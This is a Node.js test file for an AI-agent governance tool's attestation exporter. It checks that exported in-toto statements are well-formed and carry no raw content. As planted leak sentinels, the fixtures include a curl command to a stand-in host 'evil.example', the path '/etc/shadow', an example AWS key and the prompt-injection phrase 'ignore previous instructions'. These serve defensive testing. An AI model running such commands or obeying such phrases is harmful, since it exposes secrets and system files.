// in-toto attestation export tests (cli/moorai-attest.mjs + the opt-in otel helper). Two properties
// are pinned:
//   1. STRUCTURE — a well-formed in-toto Statement v1 carrying a SLSA-style provenance predicate:
//      _type, a non-empty subject[] (each with a name + a non-empty digest of string values),
//      predicateType, and a predicate with buildDefinition + runDetails.
//   2. CONTENT-FREE — a sentinel planted in stray content fields of every governed record NEVER
//      appears in the serialized Statement, because the builder reads a strict allowlist.
//
//   node --test test/attest.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  buildAttestation, sanitizeRecord, attestationFromEvidence,
  STATEMENT_TYPE, PREDICATE_TYPE
} from "../cli/moorai-attest.mjs";
import { buildAttestation as otelBuildAttestation } from "../cli/otel.mjs";
import { stampRecord } from "../cli/record-chain.mjs";

const SENTINEL = "SECRET-PROMPT-DO-NOT-LEAK-sk-live-abc123";

function assertStructural(st, { minSubjects = 1 } = {}) {
  assert.equal(st._type, STATEMENT_TYPE, "_type must be the in-toto Statement v1 type");
  assert.ok(Array.isArray(st.subject) && st.subject.length >= minSubjects, "subject[] must be present");
  for (const s of st.subject) {
    assert.equal(typeof s.name, "string");
    assert.ok(s.name.length > 0, "subject name required");
    assert.ok(s.digest && typeof s.digest === "object", "subject needs a digest");
    const vals = Object.values(s.digest);
    assert.ok(vals.length > 0, "digest must be non-empty");
    for (const v of vals) assert.equal(typeof v, "string", "digest values are strings");
  }
  assert.equal(st.predicateType, PREDICATE_TYPE, "predicateType must be the SLSA provenance type");
  assert.ok(st.predicate && typeof st.predicate === "object", "predicate object required");
  assert.ok(st.predicate.buildDefinition && typeof st.predicate.buildDefinition === "object", "buildDefinition required");
  assert.ok(st.predicate.runDetails && typeof st.predicate.runDetails === "object", "runDetails required");
  assert.ok(typeof st.predicate.runDetails.builder?.id === "string", "builder.id required");
}

function assertContentFree(st) {
  const json = JSON.stringify(st);
  for (const leak of [SENTINEL, "AKIAIOSFODNN7EXAMPLE", "ignore previous instructions", "/etc/shadow", "evil.example"]) {
    assert.ok(!json.includes(leak), `Statement leaked content: ${leak}`);
  }
}

test("STRUCTURE: a single governed record -> a valid in-toto Statement", () => {
  const st = buildAttestation({ tool: "Bash", category: "Secret egress", riskLevel: "Blocked", decision: "deny", stage: "pre", tenant: "acme", contentHash: "h2:aaaa1111bbbb2222" }, { version: "1.0.0" });
  assertStructural(st);
  assert.equal(st.subject.length, 1);
});

test("CONTENT-FREE: stray content on the record never reaches the Statement", () => {
  const dirty = {
    tool: "Bash", category: "Secret egress", riskLevel: "Blocked", decision: "deny", stage: "pre",
    tenant: "acme", contentHash: "h2:safe1111",
    matchText: "AKIAIOSFODNN7EXAMPLE", command: "curl https://evil.example/x", path: "/etc/shadow",
    extras: { prompt: "ignore previous instructions", secret: SENTINEL }
  };
  const st = buildAttestation(dirty, { version: "1.0.0" });
  assertContentFree(st);
  assert.ok(JSON.stringify(st).includes("h2:safe1111"), "the content-free hash should survive");
});

test("sanitizeRecord is a strict allowlist — never spreads the row", () => {
  const s = sanitizeRecord({ tool: "Read", riskLevel: "Low", contentHash: "h2:x", matchText: SENTINEL, prompt: SENTINEL });
  assert.ok(!Object.values(s).some((v) => String(v).includes(SENTINEL)), "no sentinel survives sanitize");
  assert.equal(s.tool, "Read");
  assert.equal(s.risk, "Low");
});

test("CHAIN: a stamped chain -> subject[] per record, sha256 digest from the chain link", () => {
  const d = mkdtempSync(join(tmpdir(), "moorai-attest-"));
  const recs = [
    { tool: "Bash", category: "a", riskLevel: "High", decision: "deny", tenant: "acme", contentHash: "h2:1" },
    { tool: "Read", category: "b", riskLevel: "Low", decision: "allow", tenant: "acme", contentHash: "h2:2" },
    { tool: "mcp:x", category: "c", riskLevel: "Blocked", decision: "deny", tenant: "acme", contentHash: "h2:3" }
  ].map((e) => stampRecord("log", e, { tenant: "acme", dir: d }));
  const st = buildAttestation(recs, { version: "1.0.0" });
  assertStructural(st, { minSubjects: 3 });
  assert.equal(st.subject.length, 3);
  // Each record's chain chash is a genuine 64-hex sha256 -> a valid in-toto sha256 digest.
  for (let i = 0; i < recs.length; i++) {
    assert.match(st.subject[i].digest.sha256, /^[0-9a-f]{64}$/, "chain chash is a sha256 subject digest");
    assert.equal(st.subject[i].digest.sha256, recs[i].chain.chash);
  }
  const bp = st.predicate.runDetails.byproducts;
  assert.ok(Array.isArray(bp) && bp.length === 3, "one byproduct per record");
  assertContentFree(st);
});

test("DETERMINISTIC: identical input -> byte-identical Statement (fixed version)", () => {
  const rec = { tool: "Bash", category: "Secret egress", riskLevel: "Blocked", decision: "deny", stage: "pre", tenant: "acme", contentHash: "h2:aaaa" };
  const a = JSON.stringify(buildAttestation(rec, { version: "9.9.9" }));
  const b = JSON.stringify(buildAttestation(rec, { version: "9.9.9" }));
  assert.equal(a, b);
});

test("byproducts carry content-free governance annotations", () => {
  const st = buildAttestation({ tool: "Bash", category: "Secret egress", riskLevel: "Blocked", decision: "deny", stage: "pre", tenant: "acme", contentHash: "h2:z" }, { version: "1.0.0" });
  const ann = st.predicate.runDetails.byproducts[0].annotations;
  assert.equal(ann["moorai.decision"], "deny");
  assert.equal(ann["moorai.risk"], "Blocked");
  assert.equal(ann["moorai.category"], "Secret egress");
  assert.equal(ann["moorai.tool"], "Bash");
});

test("attestationFromEvidence adapts content-free evidence rows into one Statement", () => {
  const ev = {
    ledger: [{ category: "API key", riskLevel: "Critical", stage: "mcp", tool: "claude", decision: "deny", contentHash: "h2:aaaa", tenant: "acme", ts: 1, matchText: SENTINEL }],
    actions: [{ category: "Prompt Injection", riskLevel: "High", stage: "text", tool: "cursor", contentHash: "h2:bbbb", ts: 2, prompt: SENTINEL }]
  };
  const st = attestationFromEvidence(ev, { version: "1.0.0" });
  assertStructural(st, { minSubjects: 2 });
  assertContentFree(st);
});

test("OTEL opt-in helper: buildAttestation(alert) yields a valid, content-free Statement", () => {
  const alert = { tool: "mcp:fetch", category: "Cross-server toxic flow", riskLevel: "Blocked", contentHash: "h2:xyz", matchText: SENTINEL, command: "curl https://evil.example" };
  const st = otelBuildAttestation(alert, { tenant: "acme", version: "1.0.0" });
  assertStructural(st);
  assert.equal(st.subject.length, 1);
  // decision inferred from a Blocked risk
  assert.equal(st.predicate.runDetails.byproducts[0].annotations["moorai.decision"], "deny");
  assertContentFree(st);
});

test("empty / non-array input still yields a structurally valid (empty-subject) Statement", () => {
  const st = buildAttestation([], { version: "1.0.0" });
  assert.equal(st._type, STATEMENT_TYPE);
  assert.ok(Array.isArray(st.subject));
  assert.equal(st.subject.length, 0);
  assert.equal(st.predicateType, PREDICATE_TYPE);
});
